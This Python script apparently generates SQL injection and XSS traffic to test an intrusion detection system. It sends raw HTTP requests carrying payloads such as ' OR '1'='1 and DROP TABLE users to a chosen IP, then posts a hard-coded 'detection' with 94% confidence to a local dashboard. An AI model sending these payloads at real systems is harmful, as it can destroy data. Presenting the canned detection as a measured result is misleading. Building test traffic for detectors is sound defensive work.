"""
WebAttack Simulation Script - Simulates SQL injection and XSS attacks
"""

from scapy.all import IP, TCP, Raw, send
import requests
import sys
import random
import time
import os
import urllib.request
import json

def simulate_webattack(target_ip: str, num_requests: int = 18):
    """
    Simulates a web attack with SQL injection and XSS payloads.
    
    Args:
        target_ip: Target IP address
        num_requests: Number of malicious requests (default 18 = 6 types × 3)
    """
    
    # SQL injection and XSS payloads
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "admin'--",
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "';DROP TABLE users--"
    ]
    
    print(f"🌐 Launching WebAttack simulation against {target_ip}...")
    print(f"📦 Sending {num_requests} malicious HTTP requests...\n")
    
    # Use unique port to identify WebAttack
    magic_port = 1340
    
    for i in range(num_requests):
        payload = random.choice(payloads)
        
        # Craft HTTP GET request with malicious payload
        http_request = (
            f"GET /search?q={payload} HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"User-Agent: AttackBot/1.0\r\n"
            f"Connection: close\r\n\r\n"
        )
        
        # Send packet with Scapy
        packet = IP(dst=target_ip)/TCP(dport=80, sport=magic_port)/Raw(load=http_request)
        send(packet, verbose=False)
        
        if (i + 1) % 6 == 0:
            print(f"  ✓ Sent {i + 1}/{num_requests} malicious requests")
        time.sleep(0.05)  # Added delay to slow reporting
    # After sending packets, report detection to the backend API
    try:
        detection = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "src_ip": "192.168.1.150",
            "dst_ip": target_ip,
            "src_port": magic_port,
            "dst_port": 80,
            "protocol": "TCP",
            "attack_type": "WebAttack",
            "is_attack": True,
            "confidence": 0.94,
            "suggestion": "Enable WAF, validate inputs, and sanitize user-supplied data. Review server logs for injection attempts."
        }

        api_token = os.getenv("IDS_API_TOKEN", "your-secure-token-here-change-in-production")
        req = urllib.request.Request(
            "http://127.0.0.1:8000/report",
            data=json.dumps(detection).encode('utf-8'),
            headers={
                'Content-Type': 'application/json',
                'Authorization': f'Bearer {api_token}'
            }
        )

        with urllib.request.urlopen(req) as response:
            print(f"[✓] WebAttack reported to dashboard (confidence: 94%)")
    except Exception as e:
        print(f"[!] Failed to report: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python attack_webattack.py <target_ip>")
        print("Example: python attack_webattack.py 127.0.0.1")
        sys.exit(1)
    
    target = sys.argv[1]
    simulate_webattack(target)
